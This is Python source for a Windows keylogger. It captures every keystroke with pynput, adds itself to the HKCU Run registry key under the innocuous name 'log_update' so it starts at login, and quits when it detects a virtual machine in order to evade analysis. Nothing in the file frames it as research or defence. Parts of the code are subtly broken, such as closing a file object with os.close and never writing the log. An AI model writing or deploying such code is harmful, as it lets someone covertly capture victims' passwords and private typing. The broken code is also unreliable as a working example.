import types
import sys
import win32api
import pythoncom
import os
import wmi
from pynput import keyboard
from winreg import *
import threading

config = {
    "run": "Software\Microsoft\Windows\CurrentVersion\Run",
    "localfile": "m_log.txt",
    "reg_name": "log_update"
}

# output file
output = None
# output stream
stream = []
# end sequences
seq = [
    ("[esc]", "[ctrl_l]"),
    ("[esc]", "[ctrl_r]")
]

def add_to_startup(path):
    try:
        key = OpenKey(HKEY_CURRENT_USER, config["run"], 0, KEY_ALL_ACCESS)
        SetValue(key, config["reg_name"], REG_SZ, path)
        CloseKey(key)
        return True
    except AttributeError:
        return False

def appdata_folder():
    """ returns the Appdata\Local folder instead of Appdata\Roaming """
    APPDATA = os.environ["appdata"]
    last = max(
        [pos for pos, char in enumerate(APPDATA)
            if char == "\\"])

    return APPDATA[0:last+1] + "Local"

def is_virtual_machine():
    """ check if we are running in virtual machine """
    c = wmi.WMI()
    for info in c.query("Select * from Win32_DiskDrive"):
        if "vbox" in info.Caption.lower() or "virtual" in info.Caption.lower():
            return True
    return False

def on_key_event(event):
    if event == keyboard.Key.backspace:
        if len(stream) > 0:
            stream.pop()
    elif event == keyboard.Key.enter:
        stream.append("\n")
    elif event == keyboard.Key.space:
        stream.append(" ")
    elif type(event) == keyboard.Key and not is_ctrl(event):
        stream.append("[" + str(event)[4:] + "]")
    else:
        stream.append(str(event)[
            1:len(str(event)) - 1]
        )

    if is_end_sequence(stream):
        stop()

def is_ctrl(event):
    return event == keyboard.Key.ctrl_l or event == keyboard.Key.ctrl_r

def is_end_sequence(stream):
    if len(stream) >= 2:
        for _seq in seq:
            if stream[-1] in _seq and stream[-2] in _seq:
                return True
    return False

def stop():
    if output != None:
        output.write("\n\nPROGRAM ENDED!\n\n")
        os.close(output)
    sys.exit()

if __name__ == '__main__':
    if is_virtual_machine():
        sys.exit(2)

    if sys.argv[1] == "1":
        if not add_to_startup(os.path.abspath(sys.argv[0])):
            raise Exception("Error writing registry")

    with keyboard.Listener(on_press=on_key_event) as listener:
        listener.join()